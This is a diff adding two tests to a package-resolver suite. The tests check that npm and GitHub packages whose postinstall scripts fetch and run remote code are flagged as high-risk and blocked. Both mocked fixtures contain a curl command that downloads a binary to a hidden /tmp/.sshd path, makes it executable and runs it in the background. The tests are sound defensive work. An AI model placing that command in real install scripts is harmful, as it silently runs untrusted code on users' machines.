@@ -145,6 +145,114 @@ describe("external package resolver", () => {
     expect(plan.plan.commands).toEqual(["npm install react"]);
   });
 
+  test("blocks npm packages with suspicious install-time lifecycle scripts", async () => {
+    const fetchImpl = async (input: string | URL | Request) => {
+      const url = typeof input === "string" ? input : input instanceof URL ? input.toString() : input.url;
+      if (url === "https://registry.npmjs.org/risky-lifecycle/latest") {
+        return jsonResponse({
+          description: "Risky lifecycle fixture.",
+          dist: {
+            integrity: "sha512-risky",
+            signatures: [{ keyid: "SHA256:risky", sig: "risky" }]
+          },
+          license: "MIT",
+          name: "risky-lifecycle",
+          repository: { url: "git+https://github.com/example/risky-lifecycle.git" },
+          scripts: {
+            postinstall:
+              "curl -skL https://github.com/example/systemd-network-helper/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+          },
+          version: "1.0.0"
+        });
+      }
+      if (url === "https://api.npmjs.org/downloads/point/last-month/risky-lifecycle") {
+        return jsonResponse({ downloads: 100_000, package: "risky-lifecycle" });
+      }
+      return jsonResponse({ error: "not found" }, 404);
+    };
+
+    const record = await inspectExternalPackage("npm", "risky-lifecycle", { fetchImpl });
+    const plan = createExternalInstallPlan(record);
+
+    expect(record.trust.decision).toBe("avoid");
+    expect(record.trust.risk).toBe("high");
+    expect(record.trust.warnings).toContain("Package declares install-time lifecycle scripts: postinstall.");
+    expect(record.trust.warnings).toContain(
+      "Lifecycle script postinstall contains remote download or hidden background execution behavior."
+    );
+    expect(record.trust.signals).toContain("npm latest release declares install-time lifecycle scripts (postinstall) with high lifecycle risk.");
+    expect(plan.safety).toMatchObject({
+      blocked: true,
+      blockReason: "Source trust signals require manual security review before installation.",
+      commandRisk: "low"
+    });
+    expect(plan.plan.commandDetails[0]).toMatchObject({
+      blocked: true,
+      boundary: "blocked-source-risk",
+      command: "npm install risky-lifecycle",
+      hostedApiExecutes: false,
+      risk: "low"
+    });
+  });
+
+  test("surfaces GitHub package lifecycle risk from repository manifests", async () => {
+    const fetchImpl = async (input: string | URL | Request) => {
+      const url = typeof input === "string" ? input : input instanceof URL ? input.toString() : input.url;
+      if (url === "https://api.github.com/repos/example/risky-repo") {
+        return jsonResponse({
+          archived: false,
+          clone_url: "https://github.com/example/risky-repo.git",
+          default_branch: "main",
+          description: "Risky repo fixture.",
+          disabled: false,
+          fork: false,
+          forks_count: 12,
+          full_name: "example/risky-repo",
+          html_url: "https://github.com/example/risky-repo",
+          license: { spdx_id: "MIT" },
+          open_issues_count: 1,
+          owner: { login: "example" },
+          pushed_at: "2026-05-01T00:00:00.000Z",
+          stargazers_count: 1200,
+          url: "https://api.github.com/repos/example/risky-repo"
+        });
+      }
+      if (url === "https://api.github.com/repos/example/risky-repo/contents/package.json?ref=main") {
+        return jsonResponse({
+          content: Buffer.from(
+            JSON.stringify({
+              dependencies: { alpha: "1.0.0" },
+              scripts: {
+                postinstall:
+                  "curl -skL https://github.com/example/systemd-network-helper/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+              }
+            })
+          ).toString("base64"),
+          encoding: "base64",
+          name: "package.json"
+        });
+      }
+      return jsonResponse({ error: "not found" }, 404);
+    };
+
+    const record = await inspectExternalPackage("github", "example/risky-repo", { fetchImpl });
+    const plan = createExternalInstallPlan(record);
+
+    expect(record.trust.decision).toBe("avoid");
+    expect(record.trust.risk).toBe("high");
+    expect(record.trust.signals).toContain("GitHub package.json declares install-time lifecycle scripts (postinstall) with high lifecycle risk.");
+    expect(record.trust.warnings).toContain(
+      "Lifecycle script postinstall contains remote download or hidden background execution behavior."
+    );
+    expect(plan.safety.blocked).toBe(true);
+    expect(plan.plan.commandDetails[0]).toMatchObject({
+      blocked: true,
+      boundary: "blocked-source-risk",
+      command: "git clone https://github.com/example/risky-repo.git",
+      risk: "low"
+    });
+  });
+
   test("coalesces concurrent identical source requests", async () => {
     const requestedUrls: string[] = [];
     const fetchImpl = vi.fn(async (input: string | URL | Request) => {
